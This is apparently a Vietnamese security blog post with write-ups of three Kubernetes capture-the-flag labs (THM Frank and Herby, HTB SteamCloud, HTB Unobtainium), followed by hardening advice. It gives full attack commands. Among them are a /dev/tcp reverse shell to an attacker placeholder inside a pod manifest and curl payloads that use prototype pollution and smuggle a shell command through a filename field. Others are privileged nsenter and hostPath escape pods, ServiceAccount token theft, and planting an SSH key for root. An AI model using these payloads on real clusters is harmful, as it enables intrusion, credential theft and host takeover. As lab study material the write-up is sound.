---
title: "Lab THM HTB về Kubernetes"
date: 2026-05-24 00:00:00 +0700
categories: ["Security-Research"]
tags: ["Kubernetes", "Security", "HTB", "THM"]
---


### Lab THM Frank and Herby try again.....

![](/assets/images/posts/Pasted%20image%2020260522231336.png)

Bước đầu tiên thì quét Nmap để tìm các attack surface

![](/assets/images/posts/Pasted%20image%2020260522232951.png)


Kết quả quét Nmap  cho thấy mục tiêu (IP `10.49.173.204`) đang mở khá nhiều cổng dịch vụ lạ. Đây có vẻ là một cụm **Kubernetes** hoặc một môi trường container.

Dưới đây là phân tích các cổng đang mở:

Các cổng đáng chú ý

- **Cổng 22 (ssh)**: Cổng quản lý từ xa qua dòng lệnh.
- **Cổng 10250, 10255, 10257, 10259**: Đây là các cổng đặc trưng của **Kubernetes Kubelet API**.
    - `10250`: Kubelet API (thường yêu cầu xác thực).
    - `10255`: Read-only Kubelet API (thường không yêu cầu xác thực, có thể lộ thông tin nhạy cảm).
    - cổng `10257` tương ứng với kube-controller-manager
    - cổng `10259` tương ứng với kube-scheduler trên các node mặt phẳng điều khiển Kubernetes.
- **Cổng 30679**: Đây có thể là một **NodePort** (dịch vụ được ứng dụng bên trong Kubernetes đưa ra ngoài).

![](/assets/images/posts/Pasted%20image%2020260522233352.png)


Có 1 web server port 30679 được expose nên tui có thể truy cập để xem thử

![](/assets/images/posts/Pasted%20image%2020260522233502.png)

Curl tới api đó để đọc thì thấy

![](/assets/images/posts/Pasted%20image%2020260522234813.png)


![](/assets/images/posts/Pasted%20image%2020260522234914.png)


**Phân tích thông tin JSON thu được `/pods`, ta có thể thấy có 4 pod đang chạy trên máy:

```
calico-node             
calico-kube-controllers 
coredns                 
php-deploy          
```

![](/assets/images/posts/Pasted%20image%2020260522235131.png)


Sau khi wappalyzer thì thấy web server sử dụng php version 8.1.0 , thì ở đây tui cũng đã đoán được mình cần RCE vào server này , và sau đó mình lên git và tìm PoC này để có thể chạy mã khai thác
https://github.com/flast101/php-8.1.0-dev-backdoor-rce



![](/assets/images/posts/Pasted%20image%2020260522235945.png)

Dựng máy lắng nghe thì dành được reverse shell thành công

![](/assets/images/posts/Pasted%20image%2020260522235955.png)


![](/assets/images/posts/Pasted%20image%2020260523000134.png)


![](/assets/images/posts/Pasted%20image%2020260523000327.png)


Chuyển sang sử dụng pwncat để có thể tải kubectl do ko dùng curl hoặc wget được 

Nhưng  sau 1 hồi cài pwncat-cs thì thư viện có khả nhiều lỗi và tui mất cũng vài tiếng nhưng cũng ko thể fix được. Nên sau một hồi tham  khảo WU của các pháp sư nước ngoài  thì tui nhận ra vẫn còn cách n ày để có thể tải kubectl lên

Đảm bảo bạn đang đứng ở thư mục chứa file `kubectl` trên máy Kali và bật server lên:

Bash

```
python3 -m http.server 80
```


Tại cửa sổ shell của container, bạn chạy lệnh PHP này để tải file trực tiếp (nhớ thay `192.168.246.92` bằng IP VPN `tun0` hiện tại của bạn):

Bash

```
php -r 'copy("http://192.168.246.92/kubectl", "/tmp/kubectl");'
```

_(Bạn nhìn sang terminal máy Kali, nếu thấy dòng log `192.168.x.x - - [2026...] "GET /kubectl HTTP/1.1" 200` hiện ra là file đã được tải sang thành công mượt mà)._



Bây giờ cấp quyền thực thi cho file và kiểm tra xem Service Account trong Pod này có thể đọc được những gì trong cụm Kubernetes:

Bash

```
chmod +x /tmp/kubectl

# Kiểm tra danh sách Pod trong namespace hiện tại
/tmp/kubectl get pods

# Kiểm tra xem Service Account của bạn có những quyền gì (Rất quan trọng để biết đường leo thang)
/tmp/kubectl auth can-i --list
```

```
root@php-deploy-6d998f68b9-pj8v5:/tmp# ./kubectl auth can-i --list
./kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
root@php-deploy-6d998f68b9-pj8v5:/tmp# 

```

Để truy cập vào máy chủ, chúng ta sẽ chạy lệnh sau, lệnh này có thể tìm thấy trên [HackTricks](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/abusing-roles-clusterroles-in-kubernetes#pod-create-and-escape) :

```
kubectl run r00t --restart=Never -it --image something --rm --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"vulhub/php:8.1-backdoor","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Hãy cùng phân tích để hiểu rõ điều gì đang xảy ra:

- `kubectl`- Vâng, rõ ràng là nó làm gì: tương tác với cụm Kubernetes.
- `run r00t`- Khởi tạo một pod có tên`r00t`
- `--restart=Never`- Nếu thiết bị dừng hoạt động, đừng khởi động lại nó.
- `-it`- Cấp phát một TTY cho container trong pod và kết nối `stdin`với nó ( _nghĩa là_ cho phép chúng ta tương tác với container)
- `--image something`- Ở đây chúng ta cần có hình ảnh cho pod, tuy nhiên vì nó sẽ bị ghi đè nên nó có thể là bất kỳ hình ảnh nào.
- `--rm`- Xóa pod sau khi nó thoát
- `--overrides`- Sử dụng JSON nội tuyến để ghi đè lên đối tượng được tạo tự động

Bây giờ chúng ta sẽ xem xét các giá trị mà chúng ta đang ghi đè.

```
{
    "spec": {
        "hostPID": true,
        "containers": [{
            "name": "1",
            "image": "vulhub/php:8.1-backdoor",
            "command": ["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],
            "stdin": true,
            "tty":true,
            "imagePullPolicy":"IfNotPresent",
            "securityContext": {
                "privileged": true
            }
        }]
    }
}
```

Sau khi chỉnh sửa các giá trị ghi đè, chúng ta có thể thấy rằng pod sẽ chia sẻ không gian tên ID tiến trình máy chủ ( `hostPID`), sẽ có một container sử dụng hình ảnh mà chúng ta đã có trong node của mình (vì chúng ta không có quyền truy cập internet - chúng ta phải thực hiện thay đổi này) và sẽ chạy ở chế độ đặc quyền.

Lệnh sẽ được thực thi khi container khởi động là `nsenter`lệnh cho phép chúng ta chạy một chương trình trong một namespace khác. Cờ này `--mount=/proc/1/ns/mnt`cho biết `nsenter`sẽ vào namespace được gắn kết (hay còn gọi là hệ thống tập tin) của tiến trình có PID 1, tức là `init`tiến trình đó, có nghĩa là chúng ta sẽ thực thi `/bin/bash`trong hệ thống tập tin của máy chủ (vì chúng ta đang tham chiếu đến hệ thống tập tin `init`của máy chủ chứ không phải của container, do `hostPID`giá trị của cờ), nói cách khác, chúng ta đang ở bên trong máy chủ.

Sau đó, chúng ta lại được đưa vào một shell có quyền root, nhưng lần này là bên trong máy chủ, vì vậy tất cả những gì chúng ta cần làm là lấy các cờ từ `/home/herby/user.txt`và `/root/root.txt`.


hoặc bạn có thể tạo 1 bad pods bằng cách này 

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

```
apiVersion: v1
kind: Pod
metadata:
  name: pwned
  labels:
    app: pwn
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwned
    image: docker.io/vulhub/php:8.1-backdoor
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /

```


https://qiita.com/rikum0730/items/813d8fc29b8788387cb1
https://dmaxter.pt/writeups/thm-frank-and-herby-try-again/


## HTB SteamCloud - Kubernetes/Kubelet Misconfiguration

![](/assets/images/posts/Pasted%20image%2020260524221954.png)

> **Nguồn tham khảo:** https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html  
> **Mục tiêu học:** hiểu chuỗi tấn công từ Kubelet API exposed → chiếm pod → lấy ServiceAccount token → lạm dụng quyền tạo pod để mount filesystem của host.

### 1. Tổng quan bài lab

SteamCloud là một máy HTB mức Easy nhưng rất hợp để học Kubernetes security vì luồng khai thác khá sạch:

```text
Recon port K8s
→ Kubelet API exposed
→ Exec vào pod nginx
→ Lấy ServiceAccount token
→ Authenticate vào Kubernetes API
→ Kiểm tra RBAC
→ Tạo pod mount root filesystem của host
→ Đọc root.txt / lấy root shell host
```

Điểm quan trọng của bài này không nằm ở exploit CVE, mà nằm ở **misconfiguration**:

- Kubelet API port `10250` có thể tương tác từ bên ngoài.
- Attacker có thể `exec` command vào pod đang chạy.
- ServiceAccount trong pod có quyền `get`, `list`, `create pods`.
- Quyền `create pods` đủ nguy hiểm để tạo pod mới có `hostPath` mount `/` của node.

### 2. Recon

Scan full port:

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.133
```

Các port đáng chú ý:

```text
22/tcp     ssh
2379/tcp   etcd-client
2380/tcp   etcd-server
8443/tcp   Kubernetes API server / minikube API
10249/tcp  kube-proxy metrics
10250/tcp  Kubelet API
10256/tcp  kube-proxy healthz
```

Scan service/version:

```bash
nmap -p 22,2379,2380,8443,10249,10250,10256 -sCV -oA scans/nmap-tcpscripts 10.10.11.133
```

Nhìn certificate ở port `8443` thấy nhiều dấu hiệu đây là môi trường **minikube/Kubernetes**:

```text
commonName=minikube
DNS:kubernetes.default.svc.cluster.local
DNS:kubernetes.default
IP Address:10.96.0.1
IP Address:127.0.0.1
```

Kết luận nhanh:

- `8443`: Kubernetes API Server, cần credential.
- `10250`: Kubelet API, có khả năng bị cấu hình lỏng.
- `2379/2380`: etcd, nhưng trong bài này không phải đường khai thác chính.

### 3. Thử Kubernetes API Server

Gọi API bằng `kubectl` thì bị yêu cầu xác thực:

```bash
kubectl --server https://10.10.11.133:8443 get pods
kubectl --server https://10.10.11.133:8443 get namespaces
kubectl --server https://10.10.11.133:8443 cluster-info
```

Kết quả là `kubectl` hỏi username/password hoặc trả về `Forbidden`, nghĩa là chưa có credential để đi qua API Server.

### 4. Khai thác Kubelet API

Dùng `kubeletctl` để tương tác với Kubelet port `10250`:

```bash
kubeletctl pods -s 10.10.11.133
```

Danh sách pod đáng chú ý:

```text
storage-provisioner                 kube-system
coredns-78fcd69978-7dhjv            kube-system
nginx                               default
etcd-steamcloud                     kube-system
kube-apiserver-steamcloud           kube-system
kube-controller-manager-steamcloud  kube-system
kube-scheduler-steamcloud           kube-system
kube-proxy-562gf                    kube-system
```

Pod `nginx` nằm trong namespace `default`, đây là mục tiêu dễ thử trước vì không thuộc nhóm control plane.

Có thể format danh sách pod từ JSON:

```bash
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
```

### 5. Exec vào pod nginx

Test command execution:

```bash
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Ở đây mình là `root` **trong container nginx**, chưa phải root của host.

Đọc user flag:

```bash
kubeletctl -s 10.10.11.133 exec "ls /root" -p nginx -c nginx
kubeletctl -s 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
```

Có thể lấy interactive shell trực tiếp:

```bash
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
```

### 6. Lấy ServiceAccount token trong pod

Trong Kubernetes, mỗi pod thường được mount ServiceAccount token để nói chuyện với API Server. Kiểm tra trong container:

```bash
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

Các file quan trọng:

```text
ca.crt
namespace
token
```

Ý nghĩa:

- `ca.crt`: CA certificate để trust Kubernetes API Server.
- `namespace`: namespace hiện tại của pod.
- `token`: bearer token của ServiceAccount gắn với pod.

Lưu CA cert và token về máy attacker:

```bash
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
```

Hoặc đưa token vào biến môi trường:

```bash
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

### 7. Authenticate vào Kubernetes API bằng token

Dùng `ca.crt` và token vừa lấy để gọi API Server:

```bash
kubectl --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token \
  get pods
```

Nếu thành công sẽ thấy pod `nginx`:

```text
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          ...
```

Kiểm tra quyền của ServiceAccount:

```bash
kubectl auth can-i --list \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Dòng quan trọng:

```text
pods    []    []    [get create list]
```

Đây là pivot point của bài: ServiceAccount không phải cluster-admin, nhưng có quyền **create pods** trong namespace `default`. Với quyền này, attacker có thể tạo pod mới mount filesystem của host.

### 8. Xem cấu hình pod nginx

Dump YAML của pod hiện tại:

```bash
kubectl get pod nginx -o yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Thông tin cần lấy:

```yaml
namespace: default
image: nginx:1.14.2
```

Ta dùng lại image `nginx:1.14.2` vì image này đã có sẵn trên node, tránh phụ thuộc internet/image pull.

### 9. Tạo pod mount `/` của host

Tạo file `evil-pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  containers:
  - name: attacker-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Giải thích:

- `hostPath.path: /`: mount toàn bộ root filesystem của node vào pod.
- `mountPath: /mnt`: trong container, host filesystem xuất hiện tại `/mnt`.
- `hostNetwork: true`: pod dùng network namespace của host.
- `image: nginx:1.14.2`: dùng image đã có sẵn trên node.

Apply pod:

```bash
kubectl apply -f evil-pod.yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Kiểm tra:

```bash
kubectl get pods \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

### 10. Đọc filesystem của host

Exec vào pod mới bằng Kubelet:

```bash
kubeletctl exec "id" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Liệt kê root filesystem của host:

```bash
kubeletctl exec "ls /mnt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Đọc root flag:

```bash
kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Lúc này `/mnt` chính là `/` của node thật, vì vậy `/mnt/root/root.txt` tương ứng với `/root/root.txt` trên host.

### 11. Lấy root shell trên host

Có thể tạo pod thứ hai chạy reverse shell ngay khi container start:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-shell
  namespace: default
spec:
  containers:
  - name: attacker-shell
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Trên máy attacker bật listener:

```bash
nc -lnvp 443
```

Apply pod:

```bash
kubectl apply -f attacker-shell.yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Sau khi shell callback về, có thể ghi SSH public key vào host root:

```bash
mkdir -p /mnt/root/.ssh
cd /mnt/root/.ssh
echo "ssh-ed25519 <PUBLIC_KEY> attacker@kali" > authorized_keys
```

Rồi SSH vào host:

```bash
ssh -i id_ed25519 root@10.10.11.133
```

### 12. Vì sao quyền `create pods` nguy hiểm?

Trong Kubernetes, quyền `create pods` có thể trở thành quyền leo thang rất mạnh nếu cluster không chặn các cấu hình nguy hiểm. Attacker có thể tạo pod với:

- `hostPath` mount thư mục nhạy cảm của node.
- `hostNetwork: true` để dùng network của host.
- `hostPID: true` để nhìn process của host.
- `privileged: true` để tăng khả năng escape.
- ServiceAccount khác nếu có quyền gán hoặc dùng SA mạnh hơn.

Trong SteamCloud, chỉ cần `hostPath: /` là đủ để đọc toàn bộ filesystem của node.

### 13. Mapping với đề tài VDT

Bài này khớp tốt với hướng **Kubernetes privilege escalation do misconfiguration**:

| Giai đoạn | Kỹ thuật | Ý nghĩa trong đề tài |
|---|---|---|
| Recon | Scan port K8s | Nhận diện API Server, Kubelet, etcd |
| Initial Access | Kubelet anonymous/weak access | Thực thi lệnh trong pod qua Kubelet |
| Credential Access | ServiceAccount token | Lấy credential mặc định được mount trong pod |
| Privilege Discovery | `kubectl auth can-i --list` | Kiểm tra quyền RBAC hiện có |
| Privilege Escalation | `create pods` + `hostPath` | Tạo pod độc hại mount filesystem host |
| Impact | Đọc `/root/root.txt`, SSH root | Kiểm soát node/host |

### 14. Detection / Hardening rút ra

Các điểm phòng thủ nên đưa vào phần demo hoặc báo cáo:

- Không expose Kubelet API ra ngoài network không tin cậy.
- Tắt hoặc hạn chế anonymous access vào Kubelet.
- Bật Kubelet authentication/authorization đúng cách.
- RBAC theo nguyên tắc least privilege, không cấp `create pods` bừa bãi.
- Dùng Pod Security Admission/Kyverno/Gatekeeper để chặn:
  - `hostPath` mount `/`
  - `hostNetwork: true`
  - `hostPID: true`
  - `privileged: true`
- Tắt `automountServiceAccountToken` nếu pod không cần gọi Kubernetes API:

```yaml
automountServiceAccountToken: false
```

- Giám sát hành vi runtime bằng Falco/Tetragon. Các event đáng chú ý:
  - Pod mới có `hostPath` mount `/`.
  - Pod bật `hostNetwork` hoặc `privileged`.
  - Truy cập file ServiceAccount token.
  - Exec bất thường vào container qua Kubelet.

### 15. Takeaway

SteamCloud cho thấy một lesson rất quan trọng: **không cần CVE vẫn có thể chiếm node Kubernetes nếu Kubelet/RBAC/Pod Security bị cấu hình sai**. Một ServiceAccount tưởng như chỉ có quyền `create pods` trong namespace `default` vẫn có thể bị lạm dụng để tạo pod mount filesystem của host, từ đó đọc flag hoặc cài SSH key để lấy root shell.


## HTB Unobtainium - RBAC Abuse + Secret Access + Malicious Pod



> **Nguồn tham khảo:** https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html  
> **Độ khó:** Hard  


### 1. Tổng quan chain khai thác

Unobtainium là bài Kubernetes khó hơn SteamCloud vì không đơn giản là có ngay quyền tạo pod. Luồng chính:

```text
Web/Electron app reverse
→ LFI / lấy source + credential
→ Prototype Pollution
→ Command Injection
→ RCE vào container webapp
→ Lấy ServiceAccount token default
→ Enumerate RBAC
→ Tìm namespace dev và pod devnode
→ RCE tiếp vào devnode container
→ Lấy dev ServiceAccount token
→ dev token có quyền get/list secrets trong kube-system
→ Đọc c-admin service account token
→ c-admin có quyền *.* [*]
→ Tạo malicious pod mount hostPath /
→ Đọc root.txt / kiểm soát host filesystem
```

Điểm cần học cho đề tài VDT:

- **ServiceAccount token trong pod là credential thật** để gọi Kubernetes API.
- **RBAC theo namespace có thể tạo đường pivot**: token A không mạnh ở namespace `default`, nhưng lại có quyền hữu ích ở namespace `dev`.
- **Quyền `get/list secrets` trong `kube-system` cực kỳ nguy hiểm**, vì có thể đọc token của ServiceAccount mạnh hơn.
- Sau khi có token admin, kỹ thuật kết thúc giống SteamCloud: tạo pod mount filesystem host.

### 2. Recon Kubernetes

Nmap thấy nhiều port quen thuộc của Kubernetes/minikube:

```text
22/tcp     ssh
80/tcp     web
2379/tcp   etcd-client
2380/tcp   etcd-server
8443/tcp   Kubernetes API Server
10250/tcp  Kubelet API
10256/tcp  kube-proxy healthz
31337/tcp  Node.js Express API
```

Port `8443` trả JSON kiểu Kubernetes API và báo `system:anonymous` bị forbidden, xác nhận đây là API Server:

```text
forbidden: User "system:anonymous" cannot get path "/"
```

### 3. Phần RCE ban đầu - ghi sơ

Bài gốc có phần reverse Electron package để lấy source/credential. Sau đó tìm được API Node.js có logic upload bị ảnh hưởng bởi prototype pollution.

Ý tưởng ngắn:

1. Dùng credential hợp lệ để gửi message.
2. Prototype pollution set `canUpload: true`.
3. Route `/upload` gọi command xử lý file nhưng nối `filename` không an toàn.
4. Inject command qua `filename` để có RCE.

Payload bật quyền upload:

```bash
curl -X PUT http://10.10.10.235:31337/ \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"test":"x","__proto__":{"canUpload":true}}}'
```

Payload command injection để reverse shell:

```bash
curl -X POST http://10.10.10.235:31337/upload \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"x; bash -c \"bash >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""}'
```

Nhận shell trong pod webapp:

```text
root@webapp-deployment-...:/usr/src/app# id
uid=0(root) gid=0(root) groups=0(root)
```

Lưu ý: `root` ở đây vẫn là root **trong container**, chưa phải root của node.

### 4. Lấy token trong webapp container

Trong pod, kiểm tra ServiceAccount token:

```bash
ls /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

Các file thường gặp:

```text
ca.crt
namespace
token
```

Lưu token ra máy attacker, ví dụ:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token > default-token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
```

Dùng token gọi API Server:

```bash
kubectl --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  get pods --all-namespaces
```

Ban đầu bị forbidden với pods toàn cluster, nhưng phản hồi này vẫn chứng minh token dùng được với API Server.

### 5. Enumerate RBAC với token default

Kiểm tra quyền trong namespace hiện tại:

```bash
kubectl auth can-i --list \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Token default có quyền đáng chú ý:

```text
namespaces    [get list]
```

List namespace:

```bash
kubectl get namespaces \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Kết quả có namespace `dev`:

```text
default
_dev_
kube-node-lease
kube-public
kube-system
```

Kiểm tra quyền theo namespace:

```bash
kubectl auth can-i --list -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Trong namespace `dev`, token default có thêm quyền:

```text
namespaces    [get list]
pods          [get list]
```

Đây là pivot đầu tiên: token không tạo được pod, không đọc secret, nhưng có thể **liệt kê pod ở namespace dev**.

### 6. Tìm pod devnode trong namespace dev

List pod trong namespace `dev`:

```bash
kubectl get pods -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Kết quả có các pod dạng:

```text
devnode-deployment-cd86fb5c-6ms8d
devnode-deployment-cd86fb5c-mvrfz
devnode-deployment-cd86fb5c-qlxww
```

Describe pod để lấy IP/container/image:

```bash
kubectl describe pod devnode-deployment-cd86fb5c-qlxww -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Thông tin đáng chú ý:

```text
Namespace: dev
IP: 172.17.0.4
Image: localhost:5000/node_server
Port: 3000/TCP
Mounts: /var/run/secrets/kubernetes.io/serviceaccount
```

Từ shell webapp container có thể reach pod devnode qua IP nội bộ. Scan/ping thấy port `3000` mở.

### 7. RCE sang devnode container

Ứng dụng ở devnode chạy cùng code/vuln Node.js nên có thể dùng lại chain prototype pollution + command injection.

Từ webapp container, bật `canUpload` trên devnode:

```bash
curl -X PUT http://172.17.0.3:3000/ \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"test":"x","__proto__":{"canUpload":true}}}'
```

Inject reverse shell:

```bash
curl -X POST http://172.17.0.3:3000/upload \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"x; bash -c \"bash >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""}'
```

Nhận shell mới:

```text
root@devnode-deployment-cd86fb5c-6ms8d:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Kiểm tra namespace của pod mới:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

Kết quả:

```text
dev
```

### 8. Lấy dev token và kiểm tra RBAC

Lấy token trong devnode:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token > dev-token
```

Kiểm tra quyền token này:

```bash
kubectl auth can-i --list \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Ở namespace `dev` không có gì quá mạnh. Nhưng khi kiểm tra namespace `kube-system`:

```bash
kubectl auth can-i --list -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Phát hiện quyền cực kỳ quan trọng:

```text
secrets    [get list]
```

Đây là lỗi RBAC chính của bài: ServiceAccount trong namespace `dev` lại có quyền đọc secrets trong `kube-system`.

### 9. Đọc ServiceAccount token mạnh hơn trong kube-system

List secrets trong `kube-system`:

```bash
kubectl get secrets -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Trong danh sách có secret đáng chú ý:

```text
c-admin-token-tfmp2    kubernetes.io/service-account-token
```

Describe secret để lấy token:

```bash
kubectl describe secret c-admin-token-tfmp2 -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Secret này thuộc ServiceAccount:

```text
kubernetes.io/service-account.name: c-admin
```

Lưu token admin ra file:

```bash
# copy phần token trong output vào file
nano cadmin-token
```

Hoặc dùng jsonpath nếu API trả đủ data:

```bash
kubectl get secret c-admin-token-tfmp2 -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  -o jsonpath='{.data.token}' | base64 -d > cadmin-token
```

### 10. Xác nhận quyền admin

Kiểm tra quyền của `cadmin-token`:

```bash
kubectl auth can-i --list \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Kết quả quan trọng:

```text
*.*    []    []    [*]
[*]    []    [*]
```

Nghĩa là token này có quyền full admin trên cluster.

Có thể list pods toàn cluster:

```bash
kubectl get pods --all-namespaces \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

### 11. Tìm image local để tạo malicious pod

Vì box không có internet, không nên dùng image từ Docker Hub. Tìm image đang có sẵn trong cluster:

```bash
kubectl get pods --all-namespaces \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Dump YAML từng pod để tìm image:

```bash
kubectl get pod <pod-name> -o yaml -n <namespace> \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt | grep 'image:'
```

Các image có sẵn:

```text
localhost:5000/dev-alpine
localhost:5000/node_server
```

Chọn `localhost:5000/dev-alpine` vì nhẹ và có shell.

### 12. Tạo malicious pod mount filesystem host

Tạo `root.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: kube-system
spec:
  containers:
  - name: evil
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Giải thích:

- `namespace: kube-system`: đã có admin nên có thể tạo pod ở namespace nhạy cảm.
- `image: localhost:5000/dev-alpine`: dùng image local có sẵn.
- `hostPath.path: /`: mount root filesystem của node.
- `mountPath: /mnt`: trong container, host filesystem nằm ở `/mnt`.
- `sleep 300000`: giữ container sống để còn `kubectl exec` vào.
- `hostNetwork: true`: dùng network namespace của host.

Apply pod:

```bash
kubectl apply -f root.yaml \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Exec vào pod:

```bash
kubectl exec evil-pod --stdin --tty -n kube-system \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  -- /bin/sh
```

Đọc root flag:

```bash
cd /mnt/root
cat root.txt
```

### 13. Điểm khác với SteamCloud

| Nội dung | SteamCloud | Unobtainium |
|---|---|---|
| Initial K8s access | Kubelet API cho exec trực tiếp vào nginx | RCE webapp qua app vuln |
| Token đầu tiên | Token trong nginx pod | Token trong webapp pod |
| RBAC ban đầu | Có `create pods` ngay trong default | Chỉ list namespace, list pod ở dev |
| Pivot chính | Tạo pod mount hostPath trực tiếp | Pivot sang dev pod, lấy dev token |
| Lỗi RBAC nặng | `create pods` quá rộng | dev token đọc được secrets ở kube-system |
| Admin token | Không cần admin token | Đọc `c-admin-token` từ kube-system |
| Root host | Pod mount `/` của host | Pod mount `/` của host |

### 14. Bài học RBAC cho đề tài VDT

Unobtainium minh họa rất rõ một chuỗi leo thang kiểu thực tế:

```text
Pod compromise
→ đọc ServiceAccount token
→ kiểm tra RBAC từng namespace
→ tìm namespace có quyền khác thường
→ pivot sang workload khác
→ lấy token mới
→ đọc secrets nhạy cảm
→ chiếm ServiceAccount admin
→ tạo pod độc hại
→ host filesystem access
```

Các lỗi cấu hình chính:

- Pod được tự động mount ServiceAccount token dù app không chắc cần gọi API Server.
- ServiceAccount `default` có quyền list namespace và list pods ở `dev`, giúp attacker khám phá lateral movement path.
- ServiceAccount ở `dev` có quyền `get/list secrets` trong `kube-system`, đây là quyền cực kỳ nguy hiểm.
- Secret kiểu `kubernetes.io/service-account-token` chứa token có thể dùng ngay để impersonate ServiceAccount tương ứng.
- Không có policy chặn pod mount `hostPath: /`.

### 15. Hardening / Detection

Hardening nên ghi vào báo cáo:

- Không dùng ServiceAccount `default` cho workload thật.
- Tắt mount token nếu app không cần:

```yaml
automountServiceAccountToken: false
```

